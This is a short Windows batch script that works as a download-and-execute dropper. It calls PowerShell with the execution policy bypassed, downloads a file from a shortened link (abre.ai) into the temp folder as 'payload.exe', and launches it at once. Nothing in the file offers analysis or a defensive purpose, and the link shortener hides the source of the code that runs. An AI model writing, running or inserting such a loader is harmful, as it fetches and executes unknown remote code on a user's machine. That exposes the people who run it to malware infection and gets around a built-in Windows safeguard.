@echo off
set "TargetUrl=https://abre.ai/xtom"
set "DestinationPath=%TEMP%\payload.exe"

powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object System.Net.WebClient;$w.DownloadFile('%TargetUrl%','%DestinationPath%')"

if exist "%DestinationPath%" (
    start "" "%DestinationPath%"
)